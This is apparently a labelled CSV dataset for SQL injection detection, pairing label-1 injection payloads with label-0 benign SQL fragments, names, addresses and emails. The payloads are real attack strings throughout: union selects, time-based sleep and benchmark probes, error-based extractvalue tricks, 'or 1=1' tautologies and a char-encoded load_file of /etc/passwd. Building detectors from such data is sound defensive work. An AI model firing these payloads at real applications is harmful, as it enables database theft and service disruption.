Sentence,Label
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymwb""  =  ""ymwb",1
SELECT TOP 3 * FROM aware WHERE after = 'doing',0
nydia,0
-9024  )   where 1686  =  1686 or 3069  =  8213--,1
"  SELECT weighID AS ID, repeat AS thought FROM office",0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  --",1
vallart casabella,0
65358703v,0
SELECT next ( s ) FROM cattle INNER JOIN,0
DELETE FROM cloud WHERE happy = 'wash',0
" SELECT * FROM brave ORDER BY detail ASC, wish DESC",0
"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
thomasin,0
valido casademont,0
"-6263%""   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""%""  =  """,1
"1%""   )    )     )   union all select null,null,null--",1
"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",1
SELECT report ( s FROM anyway RIGHT JOIN,0
SELECT * FROM family,0
"-8073   )    )     )   union all select 4481,4481,4481,4481--",1
batllori budi,0
" SELECT OrderID, Quantity, CASE     WHEN Quantity > 30 THEN ""The quantity is greater than 30""     WHEN Quantity  =  30 THEN ""The quantity is 30""     ELSE ""The quantity is under 30"" END FROM OrderDetails;",0
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",1
"linares, 42",0
"   SELECT cold,white,alone,frozen,new     (  (  room JOIN science ON today.somehow =  dark.specific )   INNER JOIN bushON Orders.wire =  church.whistleID ) ",0
aznar,0
"1""  )   where 8612  =  8612",1
47317,0
2840010000000000,0
SELECT TOP 50 PERCENT * FROM chamber SELECT * FROM land FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM triangle,0
"1""   )    )     )  ",1
augur,0
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",1
" select * from users where id  =  1 or "".@"" or 1  =  1 -- 1",1
5854370000000000,0
SELECT * FROM hearing WHERE Price NOT BETWEEN 10 AND 20,0
"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",1
oliveira_aptekman@engibraltar.va,0
SELECT * FROM down WHERE child NOT LIKE '[question]%',0
"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT MIN ( stared )  AS substance FROM easier,0
"  SELECT necessaryID AS ID, taste AS voice FROM house",0
SELECT DISTINCT court FROM life,0
legris@beautifulbody.yu,0
"-5840'  )   or elt  (  1032  =  1032,3623  )  ",1
1  )   where 9167  =  9167,1
fortner,0
bujaraloz,0
"  SELECT goldID AS ID, wheat AS running FROM poem",0
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1
SELECT plant ( s )  FROM where FULL OUTER JOIN,0
intxaurraga,0
1   )    )    as sfan where 7176  =  7176 and 7017  =  7358,1
1' where 6003  =  6003 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
"1'||  (  select 'ymez' from dual where 9870  =  9870 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1'||  (  select 'homm' where 4937  =  4937 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
SELECT * FROM blind,0
SELECT AVG ( instrument )  FROM construction  SELECT SUM ( finally ) ,0
SELECT TOP 3 * FROM suit WHERE seen = 'land' SELECT * FROM such,0
katsuno@novolardiseno.br,0
"1%'   )    )    union all select null,null,null,null,null,null,null,null--",1
"1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT AVG ( camera ) FROM attached SELECT SUM ( welcome ) ,0
"-8038'   )    )    or elt  (  1032  =  1032,3623  )   and    (    (   'xfyq'  =  'xfyq",1
SELECT * FROM jack WHERE view IN  ( SELECT known FROM world ) ,0
magaz de pisuerga,0
SELECT COUNT ( DISTINCT hide )  FROM block,0
"1""   )    )    as eglv where 7412  =  7412 union all select null#",1
6477,0
SELECT TOP 50 PERCENT * FROM flame SELECT * FROM shot FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM gun,0
"1%"" and make_set  (  8403  =  8403,8899  )   and ""%""  =  """,1
-7041'  )   where 6307  =  6307 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'xori' like 'xori",1
SELECT * FROM press WHERE brief BETWEEN 'neighborhood' AND 'bent',0
1  )   waitfor delay '0:0:5'--,1
"1""  )   as yecj where 1194  =  1194 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
39699852n,0
"-8159 where 2793  =  2793 union all select 2793,2793,2793,2793,2793#",1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'cbaj'  =  'cbaj,1
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",1
SELECT * FROM garage WHERE Price NOT BETWEEN 10 AND 20,0
"1""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""aall"" like ""aall",1
SELECT * FROM dollar WHERE appropriate BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM strike  WHERE sun NOT LIKE '[source]%',0
SELECT * FROM  ( SELECT running FROM these ) ,0
SELECT writer FROM party UNION ALL SELECT truth FROM upon ORDER BY train,0
terangue,0
"1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#",1
jorquera,0
252,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 715 )  ORDER BY meta_id ASC",0
SELECT AVG ( met )  FROM cap  SELECT SUM ( final ) ,0
SELECT MIN ( flies )  AS discovery FROM related,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   7240  =  7240",1
SELECT pilot ( s )  FROM feed SELECT fireplace ( s ) ,0
fabiano,0
SELECT AVG ( slow )  FROM additional  SELECT SUM ( trouble ) ,0
1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   # pkcp,1
SELECT * FROM art WHERE physical = 'dropped' LIMIT 3,0
dcada,0
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'zxon' like 'zxon",1
SELECT * FROM chart FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM should,0
SELECT wherever ( s ) FROM degree INNER JOIN,0
SELECT AVG ( Price ) FROM answer,0
SELECT dollar,0
SELECT TOP 3 * FROM discuss WHERE enjoy = 'needle' SELECT * FROM still,0
lenhart8@raullazaro.us,0
matungo,0
SELECT * FROM broke WHERE choice = 'touch' LIMIT 3,0
SELECT between ( s )  FROM section SELECT sides FROM managed,0
SELECT * FROM post ORDER BY swimming DESC,0
50835477a,0
"1'  )   where 1093  =  1093 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"  SELECT massage,built,enemy FROM order LEFT JOIN Orders ON immediately.religiousID =  paragraph.although ORDER BY bee.desert",0
"-1390%""   )    )    union all select 8930,8930,8930,8930,8930#",1
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1
SELECT * FROM hold,0
17179,0
1  )   where 2223  =  2223,1
moyes,0
"   SELECT volume, motor+ ', ' + comfortable+ ' ' + dollar+ ', ' + plus AS cowboy  FROM could",0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'fuyl'  =  'fuyl",1
173,0
"1""   )    )    as xhat where 6674  =  6674 union all select null,null,null#",1
a8o8decer,0
80876345l,0
SELECT * FROM judge WHERE energy = 'toy' FETCH FIRST 3 ROWS ONLY,0
5575670000000000,0
SELECT * FROM negative ORDER BY smallest DESC,0
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",1
mosegui bofill,0
gallinero de cameros,0
SELECT paragraph ( s FROM fourth RIGHT JOIN,0
"  SELECT Orders.halfwayrID, Employees.sale, Employees.good FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.woolID ORDER BY Orders.governmentID",0
"1'+  (  select eztr where 4260  =  4260 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   +'",1
SELECT AVG ( you )  FROM reason  SELECT SUM ( raw ) ,0
"   SELECT fence,discover,syllable,those,coast     (  (  shoot JOIN strike ON exist.near =  basis.market )   INNER JOIN rhymeON Orders.table =  torn.roseID ) ",0
1.05923E+015,0
SELECT * FROM during WHERE mind = 'walk'  OR sound = 'since',0
"  SELECT * FROM nothing WHERE find NOT IN  ( 'power', 'football', 'soon' )  ",0
"1'  )   as eany where 3169  =  3169 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"  SELECT * FROM behavior WHERE fur NOT IN  ( 'particles', 'term', 'boat' )  ",0
"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",1
"1%""  )   and 7533  =  7533 and   (  ""%""  =  """,1
"iif  (  5257  =  5257,1,1/0  )  ",1
admin'  )   or '1'  =  '1,1
miguel leon gracia 174,0
"-4305   )    )     )   union all select 2401,2401--",1
-1621' in boolean mode  )   order by 1--,1
SELECT AVG ( they ) FROM bone,0
"1%' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and '%'  =  '",1
SELECT COUNT ( actually )  FROM brush,0
1' where 5230  =  5230,1
"1%'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",1
"1""  )   as ikdo where 4128  =  4128",1
sandberg@3horas.tl,0
"1""   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  ""enfu""  =  ""enfu",1
"1"" where 2619  =  2619 and 2823  =  5100#",1
" select * from users where id  =  1 or ""1;""  =  1 or 1  =  1 -- 1",1
"-4811'   )    )     )   union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",1
"-9541  )   as bnky where 3934  =  3934 union all select 3934,3934,3934#",1
"calle sol s/n,",0
"  SELECT whomID AS ID, careful AS darkness FROM mountain",0
SELECT * FROM rose WHERE particles = 'gather',0
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'ucpa'  =  'ucpa,1
SELECT option_value FROM wp_options WHERE option_name  =  'options_twitter_url' LIMIT 1,0
"-7371'  )   union all select 4531,4531,4531#",1
"1   )    )    union all select null,null,null,null,null,null,null,null--",1
47649,0
16,0
hus24lero,0
28614822q,0
SELECT TOP 3 * FROM thought SELECT * FROM sense 3SELECT * FROM forgotten,0
DELETE FROM grandmother,0
SELECT * FROM dress WHERE memory NOT BETWEEN 'knowledge' AND 'broke',0
SELECT * FROM above,0
SELECT sport ( s )  FROM average SELECT usual FROM weigh,0
SELECT * FROM soon,0
rakin,0
pruja lantadilla,0
end and 'icny' like 'icny,1
diy$ambo,0
"-3781  )   union all select 3916,3916,3916--",1
"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  """,1
25585710g,0
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1
SELECT MIN ( boy )  AS who FROM speech,0
rivalee,0
"1' in boolean mode  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  #",1
su0r6s09,0
1525,0
SELECT stronger ( s )  FROM cause UNION,0
"1%' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",1
"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
pataki-grifties@hiteurope.by,0
grifell brathwaite,0
SELECT zero FROM write UNION ALL SELECT future FROM police ORDER BY aid,0
SELECT take ( s )  FROM helpful SELECT airplane FROM nest,0
resaca,0
7050000000000000,0
SELECT * FROM hidden FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM fifth,0
"-9496   )    )     )   or elt  (  7511  =  3951,3951  )   and    (    (     (  3514  =  3514",1
if  (  7340  =  9813  )   select 7340 else drop function yppp--,1
"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",1
lopez castrillon 162,0
SELECT * FROM library WHERE community = 'exact',0
1'  )   as gxfu where 9676  =  9676,1
1'  )   and 2006  =  2006,1
"1"" and make_set  (  8403  =  8403,8899  )   and ""fqxr"" like ""fqxr",1
"-8448%"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1
benzo,0
"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",1
1'+  (  select mfcd where 6757  =  6757 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  +',1
69320452q,0
SELECT * FROM never WHERE at = 'level',0
SELECT * FROM choose WHERE straw = 'wire' LIMIT 3,0
select * from users where id  =  '1' *$ . or 1  =  1 -- 1',1
"1  )   as iupg where 2861  =  2861 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT yellow ( s )  FROM knowledge SELECT ocean FROM audience,0
vilamasa pacheca,0
1  )   or sleep  (  5  )  #,1
if  (  8182  =  3225  )   select 8182 else drop function kpzk--,1
34170,0
"1"" where 7110  =  7110",1
DELETE FROM thought WHERE black = 'declared',0
-6722'  )   order by 1#,1
SELECT * FROM handsome WHERE five = 'anyway' FETCH FIRST 3 ROWS ONLY,0
mejury8,0
segura,0
"1'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
 UPDATE cave SET deal = 'needs'WHERE finger = 'sunlight',0
SELECT COUNT ( steady ) FROM recognize,0
zanquita,0
SELECT COUNT ( very )  FROM easier,0
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",1
"1"" or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
mahbeer,0
SELECT * FROM enter FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM situation,0
"-9891"" union all select 7489#",1
"1""  )   as yekp where 3049  =  3049 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
SELECT * FROM common WHERE planned NOT BETWEEN 'satellites' AND 'victory',0
"-9352""   )    )     )   or 3038  =  3038",1
"1'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'aovy'  =  'aovy",1
c/ cofa 39,0
SELECT MIN ( move )  AS such FROM construction,0
torre-cardela,0
"-9860  )   where 8743  =  8743 union all select 8743,8743,8743,8743,8743,8743,8743--",1
72484997z,0
SELECT * FROM were WHERE cloth IN  ( SELECT balloon FROM minerals ) ,0
SELECT writer ( s FROM black RIGHT JOIN,0
zohar@pablobracamonte.bh,0
SELECT * FROM probably WHERE more LIKE '%desert%',0
SELECT * FROM case ORDER BY somebody DESC,0
"   SELECT can, instead, term FROM official WHERE map  IS NULL",0
healy,0
-9771' or 5113  =  5365,1
antypas sardans,0
pertusa boladera,0
17154,0
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1
"c/ alcaices, 23",0
volkmann_parfrey1@sigloventidos.be,0
SELECT TOP 3 * FROM individual,0
"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1
SELECT * FROM  ( SELECT milk FROM opinion ) ,0
1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',1
SELECT TOP 3 * FROM through WHERE anyone = 'turn',0
03206041w,0
calle capitan palacios 71,0
SELECT * FROM slide 3 SELECT * FROM rope,0
